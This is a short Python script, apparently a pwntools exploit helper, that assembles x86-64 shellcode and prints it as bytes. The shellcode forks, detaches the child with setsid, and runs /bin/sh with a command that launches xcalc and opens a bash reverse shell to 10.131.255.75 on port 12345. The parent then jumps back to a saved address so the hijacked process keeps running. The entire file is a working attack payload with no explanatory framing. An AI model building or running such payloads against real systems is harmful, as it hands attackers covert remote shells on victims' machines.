#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = 'amd64'

sc = asm('''
    push SYS_fork
    pop rax
    syscall
    cmp rax, 0
    je child

parent:
    jmp tail
bak:
    pop rax
    mov rax, [rax]
    jmp rax

child:
    mov rax, SYS_setsid
    syscall
    push 0
    lea rax, [rip+arg3]
    push rax
    lea rax, [rip+arg2]
    push rax
    lea rax, [rip+arg1]
    push rax
    mov rdi, [rsp]
    mov rsi, rsp
    mov rdx, 0
    mov rax, SYS_execve
    syscall

arg1:
    .string "/bin/sh"
arg2:
    .string "-c"
arg3:
.string "nohup xcalc;bash -c 'bash -i >& /dev/tcp/10.131.255.75/12345 0<&1';"

tail:

    call bak
''')

print 'shellcode = ' + repr(sc) + ';'
print 'len = %d' % len(sc)
